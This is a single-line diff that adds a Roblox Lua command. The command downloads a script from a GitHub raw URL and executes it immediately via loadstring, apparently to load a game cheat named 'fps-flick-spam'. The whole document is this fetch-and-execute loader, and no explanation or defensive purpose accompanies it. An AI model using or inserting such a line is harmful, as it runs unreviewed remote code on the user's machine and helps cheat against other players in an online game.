@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/fps-flick-spam2-g89brt1pgr94qp.lua"))()
